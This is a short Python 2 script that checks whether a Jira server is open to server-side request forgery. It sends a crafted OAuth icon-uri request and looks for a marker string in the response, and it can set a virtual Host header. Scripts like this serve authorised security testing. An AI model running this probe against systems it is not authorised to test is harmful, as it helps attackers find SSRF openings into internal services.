import urllib2
import httplib
import socket
import ssl
import sys
import requests


def MyResolver(host):
  if host in vhost: #Vhost
    return url # IP
  else:
    return host


class MyHTTPConnection(httplib.HTTPConnection):
  def connect(self):
    self.sock = socket.create_connection((MyResolver(self.host),self.port),self.timeout)
class MyHTTPSConnection(httplib.HTTPSConnection):
  def connect(self):
    sock = socket.create_connection((MyResolver(self.host), self.port), self.timeout)
    self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file)

class MyHTTPHandler(urllib2.HTTPHandler):
  def http_open(self,req):
    return self.do_open(MyHTTPConnection,req)

class MyHTTPSHandler(urllib2.HTTPSHandler):
  def https_open(self,req):
    return self.do_open(MyHTTPSConnection,req)

opener = urllib2.build_opener(MyHTTPHandler,MyHTTPSHandler)
urllib2.install_opener(opener)
payload = '/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com/doodles'
if len(sys.argv) < 4:
	print "USAGE:"
	print "If Vhost Present -  python jira-ssrf.py TargetIP VHost port protocol"
	print "If vhost is not required - python jira-ssrf.py TargetIP port protocol"
elif len(sys.argv) == 4:
	
	host = sys.argv[1]
	port = sys.argv[2]
	protocol = sys.argv[3]
	r = requests.get(protocol+'://'+host+':'+port+payload,verify=False)
	if "Google Doodles" in r.content:
		print "vulnerable"
	else:
		print "Not Vulnerable"
else :
	url = sys.argv[1]
	vhost = sys.argv[2]
	port = sys.argv[3]
	protocol = sys.argv[4]
	mvhost = vhost.replace('http://','').replace('https://','')
	request = urllib2.Request(protocol+'://'+url+':'+port+payload)
	request.add_header('Host',mvhost)
	response = urllib2.urlopen(request)
	resp= response.read()
	if "Doodles" in resp:
		print "vulnerable"
	else:
		print "Not Vulnerable"
        
#jira-ssrf.py  192.168.1.1 example.com  443 https
 #1              2           3          4    5

 
